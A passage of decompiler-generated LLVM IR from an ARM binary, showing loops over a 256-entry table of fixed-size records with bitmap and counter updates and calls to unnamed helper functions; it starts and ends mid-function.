  %v1_ec58 = add i32 %v5_ec54, -1
  store i32 %v1_ec58, i32* %r2.global-to-local, align 4
  %v1_ec5c = and i32 %v1_ec58, 16711680
  store i32 %v1_ec5c, i32* %r0.global-to-local, align 4
  %v3_ec60 = udiv i32 %v1_ec58, 16777216
  %v4_ec68 = udiv i32 %v1_ec5c, 256
  %v5_ec68 = or i32 %v4_ec68, %v3_ec60
  %v1_ec64 = mul i32 %v1_ec58, 256
  %v4_ec6c = and i32 %v1_ec64, 16711680
  %v5_ec6c = or i32 %v5_ec68, %v4_ec6c
  store i32 %v5_ec6c, i32* %r3.global-to-local, align 4
  store i32 %v2_e84c, i32* %r1.global-to-local, align 4
  %v3_ec74 = load i32, i32* %v2_ec74, align 4
  store i32 %v3_ec74, i32* @lr, align 4
  %v5_ec78 = call i32 @llvm.bswap.i32(i32 %v1_ec58)
  store i32 %v5_ec78, i32* %r3.global-to-local, align 4
  %v3_ec7c = icmp uge i32 %v5_ec78, %v3_ec74
  store i1 %v3_ec7c, i1* %cpsr_c.global-to-local, align 1
  %v9_ec7c = icmp eq i32 %v5_ec78, %v3_ec74
  store i1 %v9_ec7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ec7c, label %dec_label_pc_ec84, label %dec_label_pc_eb7c

dec_label_pc_ec84:                                ; preds = %dec_label_pc_ec3c
  %v0_ec84 = load i32, i32* @r5, align 4
  %v2_ec84 = icmp ugt i32 %v0_ec84, 254
  store i1 %v2_ec84, i1* %cpsr_c.global-to-local, align 1
  %v7_ec84 = icmp eq i32 %v0_ec84, 255
  store i1 %v7_ec84, i1* %cpsr_z.global-to-local, align 1
  %v8_ec88 = icmp sgt i32 %v0_ec84, 255
  br i1 %v8_ec88, label %dec_label_pc_ed04, label %dec_label_pc_ec8c

dec_label_pc_ec8c:                                ; preds = %dec_label_pc_ec84
  %v2_ec94 = load i32, i32* @global_var_20a78.133, align 4
  store i32 %v2_ec94, i32* %r1.global-to-local, align 4
  %v3_ec98 = mul i32 %v0_ec84, 256
  store i32 %v3_ec98, i32* %r2.global-to-local, align 4
  %v2_ec9c = mul i32 %v0_ec84, 288
  store i32 %v2_ec9c, i32* %r3.global-to-local, align 4
  %v2_eca0 = add i32 %v2_ec94, %v2_ec9c
  store i32 %v2_eca0, i32* @r0, align 4
  %v1_eca4 = add i32 %v2_eca0, 12
  %v2_eca4 = inttoptr i32 %v1_eca4 to i32*
  %v3_eca4 = load i32, i32* %v2_eca4, align 4
  store i32 %v3_eca4, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_eca8 = icmp eq i32 %v3_eca4, 0
  store i1 %v2_eca8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_eca8, label %dec_label_pc_ecec, label %dec_label_pc_ecc8.preheader

dec_label_pc_ecc8.preheader:                      ; preds = %dec_label_pc_ec8c
  %v2_ecac = add i32 %v0_ec84, 1
  %v2_ecb4 = and i32 %v2_ecac, 134217728
  %v3_ecb4 = icmp ne i32 %v2_ecb4, 0
  store i1 %v3_ecb4, i1* %cpsr_c.global-to-local, align 1
  %v3_ecb8 = mul i32 %v2_ecac, 288
  %v3_ecbc = add i32 %v2_ec94, %v3_ecb8
  store i32 %v3_ecbc, i32* %r3.global-to-local, align 4
  store i32 %v0_ec84, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ecc8

dec_label_pc_ecc8:                                ; preds = %dec_label_pc_ecc8.preheader, %dec_label_pc_ecd4
  %v0_ecd4 = phi i32 [ %v3_ecbc, %dec_label_pc_ecc8.preheader ], [ %v1_ece0, %dec_label_pc_ecd4 ]
  %v0_ecc8 = phi i32 [ %v0_ec84, %dec_label_pc_ecc8.preheader ], [ %v1_ecc8, %dec_label_pc_ecd4 ]
  %v1_ecc8 = add i32 %v0_ecc8, 1
  store i32 %v1_ecc8, i32* %r2.global-to-local, align 4
  %v7_eccc = icmp eq i32 %v1_ecc8, 256
  br i1 %v7_eccc, label %dec_label_pc_ed04.loopexit, label %dec_label_pc_ecd4

dec_label_pc_ecd4:                                ; preds = %dec_label_pc_ecc8
  store i32 %v0_ecd4, i32* @r0, align 4
  %v1_ecd8 = add i32 %v0_ecd4, 12
  %v2_ecd8 = inttoptr i32 %v1_ecd8 to i32*
  %v3_ecd8 = load i32, i32* %v2_ecd8, align 4
  %v2_ecdc = icmp eq i32 %v3_ecd8, 0
  %v1_ece0 = add i32 %v0_ecd4, 288
  store i32 %v1_ece0, i32* %r3.global-to-local, align 4
  br i1 %v2_ecdc, label %dec_label_pc_ece8, label %dec_label_pc_ecc8

dec_label_pc_ece8:                                ; preds = %dec_label_pc_ecd4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ecc8, i32* @r5, align 4
  br label %dec_label_pc_ecec

dec_label_pc_ecec:                                ; preds = %dec_label_pc_ec8c, %dec_label_pc_ece8
  %v1_ecf4 = phi i32 [ %v2_eca0, %dec_label_pc_ec8c ], [ %v0_ecd4, %dec_label_pc_ece8 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ecec = icmp eq i32 %v1_ecf4, 0
  store i1 %v2_ecec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ecec, label %dec_label_pc_ed04, label %dec_label_pc_ecf4

dec_label_pc_ecf4:                                ; preds = %dec_label_pc_ecec
  %v2_ecf4 = add i32 %v1_ecf4, 16
  %v3_ecf4 = inttoptr i32 %v2_ecf4 to i32*
  store i32 %v3_ec74, i32* %v3_ecf4, align 4
  %v0_ecf8 = load i32, i32* %ip.global-to-local, align 4
  %v1_ecf8 = trunc i32 %v0_ecf8 to i16
  %v2_ecf8 = load i32, i32* @r0, align 4
  %v3_ecf8 = add i32 %v2_ecf8, 20
  %v4_ecf8 = inttoptr i32 %v3_ecf8 to i16*
  store i16 %v1_ecf8, i16* %v4_ecf8, align 2
  %v0_ecfc = call i32 @function_e328()
  store i32 %v0_ecfc, i32* %r0.global-to-local, align 4
  %v1_eb80.pre.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_eb7c

dec_label_pc_ed04.loopexit:                       ; preds = %dec_label_pc_ecc8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ed04

dec_label_pc_ed04:                                ; preds = %dec_label_pc_ecec, %dec_label_pc_ec84, %dec_label_pc_ebb0, %dec_label_pc_eb7c, %dec_label_pc_ed04.loopexit
  store i32 0, i32* %stack_var_-224, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1676, i32* %ip.global-to-local, align 4
  %v2_ed24513 = load i32, i32* @sp, align 4
  %v3_ed24514 = add i32 %v2_ed24513, 1676
  %v4_ed24515 = inttoptr i32 %v3_ed24514 to i32*
  store i32 0, i32* %v4_ed24515, align 4
  br label %dec_label_pc_ed10.dec_label_pc_ed10_crit_edge

dec_label_pc_ed10.dec_label_pc_ed10_crit_edge:    ; preds = %dec_label_pc_ed04, %dec_label_pc_ed10.dec_label_pc_ed10_crit_edge
  %v0_ed10.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_ed14 = add i32 %v0_ed10.pre, 4
  store i32 %v1_ed14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_ed1c = add i32 %v0_ed10.pre, 1672
  store i32 %v1_ed1c, i32* %ip.global-to-local, align 4
  %v7_ed20 = icmp eq i32 %v1_ed14, 128
  %v2_ed24 = load i32, i32* @sp, align 4
  %v3_ed24 = add i32 %v2_ed24, %v1_ed1c
  %v4_ed24 = inttoptr i32 %v3_ed24 to i32*
  store i32 0, i32* %v4_ed24, align 4
  br i1 %v7_ed20, label %dec_label_pc_ed2c, label %dec_label_pc_ed10.dec_label_pc_ed10_crit_edge

dec_label_pc_ed2c:                                ; preds = %dec_label_pc_ed10.dec_label_pc_ed10_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_ed2c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_ed2c, i32* %stack_var_-352, align 4
  %v1_ed38516 = add i32 %v0_ed2c, 8
  store i32 %v1_ed38516, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_ed40517 = add i32 %v0_ed2c, 1548
  store i32 %v1_ed40517, i32* @lr, align 4
  %v7_ed44518 = icmp eq i32 %v1_ed38516, 128
  %v2_ed48519 = load i32, i32* @sp, align 4
  %v3_ed48520 = add i32 %v2_ed48519, %v1_ed40517
  %v4_ed48521 = inttoptr i32 %v3_ed48520 to i32*
  store i32 0, i32* %v4_ed48521, align 4
  br i1 %v7_ed44518, label %dec_label_pc_ed50, label %dec_label_pc_ed34.dec_label_pc_ed34_crit_edge

dec_label_pc_ed34.dec_label_pc_ed34_crit_edge:    ; preds = %dec_label_pc_ed2c, %dec_label_pc_ed34.dec_label_pc_ed34_crit_edge
  %v0_ed34.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_ed38 = add i32 %v0_ed34.pre, 4
  store i32 %v1_ed38, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_ed40 = add i32 %v0_ed34.pre, 1544
  store i32 %v1_ed40, i32* @lr, align 4
  %v7_ed44 = icmp eq i32 %v1_ed38, 128
  %v2_ed48 = load i32, i32* @sp, align 4
  %v3_ed48 = add i32 %v2_ed48, %v1_ed40
  %v4_ed48 = inttoptr i32 %v3_ed48 to i32*
  store i32 0, i32* %v4_ed48, align 4
  br i1 %v7_ed44, label %dec_label_pc_ed50, label %dec_label_pc_ed34.dec_label_pc_ed34_crit_edge

dec_label_pc_ed50:                                ; preds = %dec_label_pc_ed34.dec_label_pc_ed34_crit_edge, %dec_label_pc_ed2c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_ed50 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_ed50, i32* @r6, align 4
  store i32 %v0_ed50, i32* @r5, align 4
  store i32 %v0_ed50, i32* %stack_var_-52, align 4
  br label %dec_label_pc_edac

dec_label_pc_ed60:                                ; preds = %dec_label_pc_eddc
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_edc8, i1* %cpsr_z.global-to-local, align 1
  %v1_ee4c = add i32 %v2_edc0, 4
  %v2_ee4c = inttoptr i32 %v1_ee4c to i32*
  %v3_ee4c = load i32, i32* %v2_ee4c, align 4
  br i1 %v7_edc8, label %dec_label_pc_ee4c, label %dec_label_pc_ed68

dec_label_pc_ed68:                                ; preds = %dec_label_pc_ed60
  store i32 %v3_ee4c, i32* %ip.global-to-local, align 4
  %v3_ed6c = udiv i32 %v3_ee4c, 32
  store i32 %v2_ee58, i32* %r0.global-to-local, align 4
  %v3_ed74 = mul nuw nsw i32 %v3_ed6c, 4
  %v2_ed78 = add i32 %v3_ed74, %v2_ee58
  store i32 %v2_ed78, i32* %r3.global-to-local, align 4
  %v1_ed7c = add i32 %v2_ed78, -184
  %v2_ed7c = inttoptr i32 %v1_ed7c to i32*
  %v3_ed7c = load i32, i32* %v2_ed7c, align 4
  %v1_ed80 = urem i32 %v3_ee4c, 32
  store i32 %v1_ed80, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v7_ed88 = shl i32 1, %v1_ed80
  %v8_ed88 = or i32 %v3_ed7c, %v7_ed88
  store i32 %v8_ed88, i32* %r2.global-to-local, align 4
  store i32 %v8_ed88, i32* %v2_ed7c, align 4
  %v0_ed90 = load i32, i32* @r6, align 4
  %v1_ed90 = load i32, i32* %ip.global-to-local, align 4
  %v3_ed90 = icmp uge i32 %v0_ed90, %v1_ed90
  store i1 %v3_ed90, i1* %cpsr_c.global-to-local, align 1
  %v9_ed90 = icmp eq i32 %v0_ed90, %v1_ed90
  store i1 %v9_ed90, i1* %cpsr_z.global-to-local, align 1
  %v5_ed94 = icmp slt i32 %v0_ed90, %v1_ed90
  br i1 %v5_ed94, label %bb409, label %bb410

bb409:                                            ; preds = %dec_label_pc_ed68
  store i32 %v1_ed90, i32* @r6, align 4
  br label %bb410

bb410:                                            ; preds = %.thread75, %bb416, %bb414, %bb418, %dec_label_pc_ee40, %dec_label_pc_ed68, %bb409
  %v3_ed98 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_ed98, i32* %r3.global-to-local, align 4
  %v1_ed9c = add i32 %v3_ed98, 1
  store i32 %v1_ed9c, i32* %r2.global-to-local, align 4
  %v2_eda0 = icmp ugt i32 %v1_ed9c, 254
  store i1 %v2_eda0, i1* %cpsr_c.global-to-local, align 1
  %v7_eda0 = icmp eq i32 %v1_ed9c, 255
  store i1 %v7_eda0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ed9c, i32* %stack_var_-52, align 4
  %v8_eda8 = icmp sgt i32 %v1_ed9c, 255
  br i1 %v8_eda8, label %dec_label_pc_ee7c, label %dec_label_pc_edac

dec_label_pc_edac:                                ; preds = %bb410, %dec_label_pc_ed50
  %v0_edb8 = phi i32 [ %v1_ed9c, %bb410 ], [ %v0_ed50, %dec_label_pc_ed50 ]
  store i32 ptrtoint (i32* @global_var_20a78.133 to i32), i32* %r0.global-to-local, align 4
  %v3_edb0 = mul i32 %v0_edb8, 256
  store i32 %v3_edb0, i32* %r3.global-to-local, align 4
  %v2_edb4 = load i32, i32* @global_var_20a78.133, align 4
  store i32 %v2_edb4, i32* %r1.global-to-local, align 4
  %v2_edbc = mul i32 %v0_edb8, 288
  store i32 %v2_edbc, i32* %r2.global-to-local, align 4
  %v2_edc0 = add i32 %v2_edb4, %v2_edbc
  store i32 %v2_edc0, i32* @r4, align 4
  %v1_edc4 = add i32 %v2_edc0, 12
  %v2_edc4 = inttoptr i32 %v1_edc4 to i32*
  %v3_edc4 = load i32, i32* %v2_edc4, align 4
  store i32 %v3_edc4, i32* %ip.global-to-local, align 4
  %v2_edc8 = icmp ne i32 %v3_edc4, 0
  store i1 %v2_edc8, i1* %cpsr_c.global-to-local, align 1
  %v7_edc8 = icmp eq i32 %v3_edc4, 1
  store i1 %v7_edc8, i1* %cpsr_z.global-to-local, align 1
  %v2_edcc = xor i1 %v2_edc8, true
  %v3_edcc = or i1 %v7_edc8, %v2_edcc
  br i1 %v3_edcc, label %bb411, label %bb412

bb411:                                            ; preds = %dec_label_pc_edac
  store i32 5, i32* %r1.global-to-local, align 4
  br label %bb412

bb412:                                            ; preds = %dec_label_pc_edac, %bb411
  %v1_edec215 = phi i32 [ %v2_edb4, %dec_label_pc_edac ], [ 5, %bb411 ]
  %v2_edd0 = xor i1 %v7_edc8, true
  %v3_edd0 = and i1 %v2_edc8, %v2_edd0
  br i1 %v3_edd0, label %bb413, label %bb414

bb413:                                            ; preds = %bb412
  store i32 30, i32* %r1.global-to-local, align 4
  br label %bb414

bb414:                                            ; preds = %bb412, %bb413
  %v1_edec = phi i32 [ %v1_edec215, %bb412 ], [ 30, %bb413 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_edd4 = icmp eq i32 %v3_edc4, 0
  store i1 %v2_edd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_edd4, label %bb410, label %dec_label_pc_eddc

dec_label_pc_eddc:                                ; preds = %bb414
  store i32 ptrtoint (i32* @global_var_1ea28.121 to i32), i32* %r2.global-to-local, align 4
  %v2_ede0 = load i32, i32* @global_var_1ea28.121, align 4
  store i32 %v2_ede0, i32* %r3.global-to-local, align 4
  %v1_ede4 = add i32 %v2_edc0, 8
  %v2_ede4 = inttoptr i32 %v1_ede4 to i32*
  %v3_ede4 = load i32, i32* %v2_ede4, align 4
  store i32 %v3_ede4, i32* %r2.global-to-local, align 4
  %v2_ede8 = sub i32 %v2_ede0, %v3_ede4
  store i32 %v2_ede8, i32* %r3.global-to-local, align 4
  %v3_edec = icmp uge i32 %v2_ede8, %v1_edec
  store i1 %v3_edec, i1* %cpsr_c.global-to-local, align 1
  %v9_edec = icmp eq i32 %v2_ede8, %v1_edec
  store i1 %v9_edec, i1* %cpsr_z.global-to-local, align 1
  %v2_edf0 = xor i1 %v3_edec, true
  %v3_edf0 = or i1 %v9_edec, %v2_edf0
  br i1 %v3_edf0, label %dec_label_pc_ed60, label %dec_label_pc_edf4

dec_label_pc_edf4:                                ; preds = %dec_label_pc_eddc
  %v1_edf4 = add i32 %v2_edc0, 4
  %v2_edf4 = inttoptr i32 %v1_edf4 to i32*
  %v3_edf4 = load i32, i32* %v2_edf4, align 4
  store i32 %v3_edf4, i32* %r0.global-to-local, align 4
  %v1_edf8 = call i32 @function_10ddc(i32 %v3_edf4)
  store i32 %v1_edf8, i32* %r0.global-to-local, align 4
  %v0_edfc = load i32, i32* @r4, align 4
  %v1_edfc = add i32 %v0_edfc, 12
  %v2_edfc = inttoptr i32 %v1_edfc to i32*
  %v3_edfc = load i32, i32* %v2_edfc, align 4
  store i32 %v3_edfc, i32* %r3.global-to-local, align 4
  %v2_ee00 = icmp ugt i32 %v3_edfc, 1
  store i1 %v2_ee00, i1* %cpsr_c.global-to-local, align 1
  %v7_ee00 = icmp eq i32 %v3_edfc, 2
  store i1 %v7_ee00, i1* %cpsr_z.global-to-local, align 1
  %v2_ee04 = xor i1 %v2_ee00, true
  %v3_ee04 = or i1 %v7_ee00, %v2_ee04
  br i1 %v3_ee04, label %bb415, label %.thread301

.thread301:                                       ; preds = %dec_label_pc_edf4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_ee0c298302 = add i32 %v0_edfc, 4
  %v3_ee0c299303 = inttoptr i32 %v2_ee0c298302 to i32*
  store i32 -1, i32* %v3_ee0c299303, align 4
  br label %bb416

bb415:                                            ; preds = %dec_label_pc_edf4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_ee0c295 = add i32 %v0_edfc, 4
  %v3_ee0c296 = inttoptr i32 %v2_ee0c295 to i32*
  store i32 -1, i32* %v3_ee0c296, align 4
  %v4_ee10 = load i32, i32* %r3.global-to-local, align 4
  %v5_ee10 = load i32, i32* @r4, align 4
  %v6_ee10 = add i32 %v5_ee10, 12
  %v7_ee10 = inttoptr i32 %v6_ee10 to i32*
  store i32 %v4_ee10, i32* %v7_ee10, align 4
  %v4_ee14 = load i32, i32* %r3.global-to-local, align 4
  %v5_ee14 = trunc i32 %v4_ee14 to i8
  %v6_ee14 = load i32, i32* @r4, align 4
  %v7_ee14 = add i32 %v6_ee14, 284
  %v8_ee14 = inttoptr i32 %v7_ee14 to i8*
  store i8 %v5_ee14, i8* %v8_ee14, align 1
  %v0_ee18.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_ee18.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb416

bb416:                                            ; preds = %.thread301, %bb415
  %v1_ee18 = phi i1 [ %v1_ee18.pre, %bb415 ], [ %v2_ee00, %.thread301 ]
  %v0_ee18 = phi i1 [ %v0_ee18.pre, %bb415 ], [ false, %.thread301 ]
  %v2_ee18 = xor i1 %v1_ee18, true
  %v3_ee18 = or i1 %v0_ee18, %v2_ee18
  br i1 %v3_ee18, label %bb410, label %dec_label_pc_ee1c

dec_label_pc_ee1c:                                ; preds = %bb416
  %v0_ee1c = load i32, i32* @r4, align 4
  %v1_ee1c = add i32 %v0_ee1c, 284
  %v2_ee1c = inttoptr i32 %v1_ee1c to i8*
  %v3_ee1c = load i8, i8* %v2_ee1c, align 1
  %v4_ee1c = zext i8 %v3_ee1c to i32
  %v1_ee20 = add nuw nsw i32 %v4_ee1c, 1
  %v1_ee24 = urem i32 %v1_ee20, 256
  store i32 %v1_ee24, i32* %r3.global-to-local, align 4
  %v2_ee28 = icmp ugt i32 %v1_ee24, 9
  store i1 %v2_ee28, i1* %cpsr_c.global-to-local, align 1
  %v7_ee28 = icmp eq i32 %v1_ee24, 10
  store i1 %v7_ee28, i1* %cpsr_z.global-to-local, align 1
  %v1_ee2c = trunc i32 %v1_ee20 to i8
  store i8 %v1_ee2c, i8* %v2_ee1c, align 1
  %v0_ee30 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ee30, label %.thread75, label %dec_label_pc_ee40

.thread75:                                        ; preds = %dec_label_pc_ee1c
  %v1_ee30 = load i32, i32* %r3.global-to-local, align 4
  %v2_ee30 = add i32 %v1_ee30, -10
  store i32 %v2_ee30, i32* %r3.global-to-local, align 4
  %v2_ee34 = load i32, i32* @r4, align 4
  %v3_ee34 = add i32 %v2_ee34, 12
  %v4_ee34 = inttoptr i32 %v3_ee34 to i32*
  store i32 %v2_ee30, i32* %v4_ee34, align 4
  %v1_ee38 = load i32, i32* %r3.global-to-local, align 4
  %v2_ee38 = trunc i32 %v1_ee38 to i8
  %v3_ee38 = load i32, i32* @r4, align 4
  %v4_ee38 = add i32 %v3_ee38, 284
  %v5_ee38 = inttoptr i32 %v4_ee38 to i8*
  store i8 %v2_ee38, i8* %v5_ee38, align 1
  %v0_ee3c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ee3c.pr.pr, label %bb410, label %dec_label_pc_ee40

dec_label_pc_ee40:                                ; preds = %dec_label_pc_ee1c, %.thread75
  %v0_ee40 = load i32, i32* @r4, align 4
  store i32 %v0_ee40, i32* @r0, align 4
  %v0_ee44 = call i32 @function_e328()
  store i32 %v0_ee44, i32* %r0.global-to-local, align 4
  br label %bb410

dec_label_pc_ee4c:                                ; preds = %dec_label_pc_ed60
  store i32 %v3_ee4c, i32* %r0.global-to-local, align 4
  %v3_ee50 = udiv i32 %v3_ee4c, 32
  %v3_ee54 = mul nuw nsw i32 %v3_ee50, 4
  store i32 %v2_ee58, i32* @lr, align 4
  %v2_ee5c = add i32 %v3_ee54, %v2_ee58
  store i32 %v2_ee5c, i32* %r3.global-to-local, align 4
  %v1_ee60 = add i32 %v2_ee5c, -312
  %v2_ee60 = inttoptr i32 %v1_ee60 to i32*
  %v3_ee60 = load i32, i32* %v2_ee60, align 4
  %v1_ee64 = urem i32 %v3_ee4c, 32
  store i32 %v1_ee64, i32* %r1.global-to-local, align 4
  %v7_ee68 = shl i32 1, %v1_ee64
  %v8_ee68 = or i32 %v3_ee60, %v7_ee68
  store i32 %v8_ee68, i32* %r2.global-to-local, align 4
  %v0_ee6c = load i32, i32* @r5, align 4
  %v3_ee6c = icmp uge i32 %v0_ee6c, %v3_ee4c
  store i1 %v3_ee6c, i1* %cpsr_c.global-to-local, align 1
  %v9_ee6c = icmp eq i32 %v0_ee6c, %v3_ee4c
  store i1 %v9_ee6c, i1* %cpsr_z.global-to-local, align 1
  %v5_ee70 = icmp slt i32 %v0_ee6c, %v3_ee4c
  br i1 %v5_ee70, label %bb417, label %bb418

bb417:                                            ; preds = %dec_label_pc_ee4c
  store i32 %v3_ee4c, i32* @r5, align 4
  br label %bb418

bb418:                                            ; preds = %dec_label_pc_ee4c, %bb417
  store i32 %v8_ee68, i32* %v2_ee60, align 4
  br label %bb410

dec_label_pc_ee7c:                                ; preds = %bb410
  store i32 0, i32* @r4, align 4
  store i32 1, i32* %stack_var_-68, align 4
  %v0_ee88 = load i32, i32* @r5, align 4
  %v1_ee88 = load i32, i32* @r6, align 4
  %v3_ee88 = icmp uge i32 %v0_ee88, %v1_ee88
  store i1 %v3_ee88, i1* %cpsr_c.global-to-local, align 1
  %v9_ee88 = icmp eq i32 %v0_ee88, %v1_ee88
  store i1 %v9_ee88, i1* %cpsr_z.global-to-local, align 1
  %v5_ee8c = icmp slt i32 %v0_ee88, %v1_ee88
  %storemerge155 = select i1 %v5_ee8c, i32 %v1_ee88, i32 %v0_ee88
  store i32 %v2_eea0, i32* %ip.global-to-local, align 4
  store i32 %v2_eea4, i32* %r1.global-to-local, align 4
  store i32 %v2_eea8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_eeb0 = add i32 %storemerge155, 1
  store i32 %v1_eeb0, i32* %r0.global-to-local, align 4
  %v5_eebc = call i32 @function_10b00(i32 %v1_eeb0, i32 %v2_eea4, i32 %v2_eea8, i32 0, i32 %v2_eea0)
  %v0_eec0 = load i32, i32* @r4, align 4
  store i32 %v0_eec0, i32* %r0.global-to-local, align 4
  %v1_eec4 = inttoptr i32 %v0_eec0 to i32*
  %v2_eec4 = call i32 @function_10a5c(i32* %v1_eec4)
  store i32 %v2_eec4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ea28.121 to i32), i32* @lr, align 4
  %v0_eecc = load i32, i32* @r4, align 4
  store i32 %v0_eecc, i32* %stack_var_-52, align 4
  store i32 %v2_eec4, i32* @global_var_1ea28.121, align 4
  br label %dec_label_pc_eed4

dec_label_pc_eed4:                                ; preds = %dec_label_pc_f03c, %dec_label_pc_ee7c
  %v0_eee0 = phi i32 [ %v1_f040, %dec_label_pc_f03c ], [ %v0_eecc, %dec_label_pc_ee7c ]
  store i32 ptrtoint (i32* @global_var_20a78.133 to i32), i32* %r0.global-to-local, align 4
  %v3_eed8 = mul i32 %v0_eee0, 256
  store i32 %v3_eed8, i32* %r3.global-to-local, align 4
  %v2_eedc = load i32, i32* @global_var_20a78.133, align 4
  store i32 %v2_eedc, i32* %r1.global-to-local, align 4
  %v2_eee4 = mul i32 %v0_eee0, 288
  store i32 %v2_eee4, i32* %r2.global-to-local, align 4
  %v2_eee8 = add i32 %v2_eedc, %v2_eee4
  store i32 %v2_eee8, i32* @r6, align 4
  %v1_eeec = add i32 %v2_eee8, 4
  %v2_eeec = inttoptr i32 %v1_eeec to i32*
  %v3_eeec = load i32, i32* %v2_eeec, align 4
  store i32 %v3_eeec, i32* %r0.global-to-local, align 4
  %v2_eef0 = icmp eq i32 %v3_eeec, -1
  store i1 %v2_eef0, i1* %cpsr_c.global-to-local, align 1
  %v7_eef0 = icmp eq i32 %v3_eeec, -1
  store i1 %v7_eef0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eef0, label %dec_label_pc_f03c, label %dec_label_pc_eef8

dec_label_pc_eef8:                                ; preds = %dec_label_pc_eed4
  %v3_eef8 = udiv i32 %v3_eeec, 32
  store i32 %v2_ee58, i32* %r1.global-to-local, align 4
  %v3_ef00 = mul nuw nsw i32 %v3_eef8, 4
  store i32 %v3_ef00, i32* @ip, align 4
  %v2_ef04 = add i32 %v3_ef00, %v2_ee58
  store i32 %v2_ef04, i32* %r2.global-to-local, align 4
  %v1_ef08 = add i32 %v2_ef04, -312
  %v2_ef08 = inttoptr i32 %v1_ef08 to i32*
  %v3_ef08 = load i32, i32* %v2_ef08, align 4
  %v1_ef0c = urem i32 %v3_eeec, 32
  store i32 %v1_ef0c, i32* %r1.global-to-local, align 4
  %v2_ef10 = add nsw i32 %v1_ef0c, -1
  %v3_ef10 = shl i32 1, %v2_ef10
  %v4_ef10 = and i32 %v3_ef08, %v3_ef10
  %v5_ef10 = icmp ne i32 %v4_ef10, 0
  store i1 %v5_ef10, i1* %cpsr_c.global-to-local, align 1
  %v6_ef10 = lshr i32 %v3_ef08, %v1_ef0c
  store i32 %v6_ef10, i32* %r3.global-to-local, align 4
  %v1_ef14 = urem i32 %v6_ef10, 2
  %v2_ef14 = icmp eq i32 %v1_ef14, 0
  store i1 %v2_ef14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef14, label %dec_label_pc_ef1c, label %dec_label_pc_fa44

dec_label_pc_ef1c:                                ; preds = %dec_label_pc_eef8, %dec_label_pc_faf0
  %v1_ef28 = phi i32 [ %v1_ef0c, %dec_label_pc_eef8 ], [ %v1_ef28.pre, %dec_label_pc_faf0 ]
  %v0_ef20 = phi i32 [ %v3_ef00, %dec_label_pc_eef8 ], [ %v0_ef20.pre, %dec_label_pc_faf0 ]
  store i32 %v2_ee58, i32* @lr, align 4
  %v2_ef20 = add i32 %v0_ef20, %v2_ee58
  store i32 %v2_ef20, i32* %r2.global-to-local, align 4
  %v1_ef24 = add i32 %v2_ef20, -184
  %v2_ef24 = inttoptr i32 %v1_ef24 to i32*
  %v3_ef24 = load i32, i32* %v2_ef24, align 4
  %v2_ef28 = add i32 %v1_ef28, -1
  %v3_ef28 = shl i32 1, %v2_ef28
  %v4_ef28 = and i32 %v3_ef24, %v3_ef28
  %v5_ef28 = icmp ne i32 %v4_ef28, 0
  store i1 %v5_ef28, i1* %cpsr_c.global-to-local, align 1
  %v6_ef28 = lshr i32 %v3_ef24, %v1_ef28
  store i32 %v6_ef28, i32* %r3.global-to-local, align 4
  %v1_ef2c = urem i32 %v6_ef28, 2
  %v2_ef2c = icmp eq i32 %v1_ef2c, 0
  store i1 %v2_ef2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef2c, label %dec_label_pc_f03c, label %dec_label_pc_ef34.preheader

dec_label_pc_ef34.preheader:                      ; preds = %dec_label_pc_ef1c
  %v0_ef34176 = load i32, i32* @r6, align 4
  %v1_ef34177 = add i32 %v0_ef34176, 12
  %v2_ef34178 = inttoptr i32 %v1_ef34177 to i32*
  %v3_ef34179 = load i32, i32* %v2_ef34178, align 4
  store i32 %v3_ef34179, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ef38175181 = icmp eq i32 %v3_ef34179, 0
  store i1 %v2_ef38175181, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef38175181, label %dec_label_pc_f03c, label %dec_label_pc_ef40.lr.ph

dec_label_pc_ef34.loopexit:                       ; preds = %dec_label_pc_f948, %dec_label_pc_f74c
